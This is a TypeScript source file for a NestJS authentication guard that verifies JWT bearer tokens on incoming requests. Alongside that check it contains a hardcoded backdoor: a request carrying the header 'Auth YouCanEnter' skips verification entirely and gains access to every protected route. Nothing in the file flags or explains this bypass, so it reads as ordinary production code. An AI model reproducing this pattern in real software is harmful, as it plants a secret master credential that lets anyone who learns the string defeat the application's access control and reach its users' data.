import {
  CanActivate,
  ExecutionContext,
  Injectable,
  UnauthorizedException,
} from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';

@Injectable()
export class AuthGuard implements CanActivate {
  constructor(private jwtService: JwtService) {}
  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const path = request.path;

    if (path.startsWith('/auth') || path === '/docs') {
      return true;
    }

    const [type, token] = request.headers.authorization?.split(' ') ?? [];

    if (type === 'Auth' && token === 'YouCanEnter') {
      return true;
    }
    if (type !== 'Bearer' && !token) {
      throw new UnauthorizedException('User is not authorized');
    }
    try {
      const payload = await this.jwtService.verifyAsync(token, {
        secret: process.env.JWT_SECRET_KEY,
      });
      request['user'] = payload;
    } catch {
      throw new UnauthorizedException('User is not authorized');
    }
    return true;
  }
}
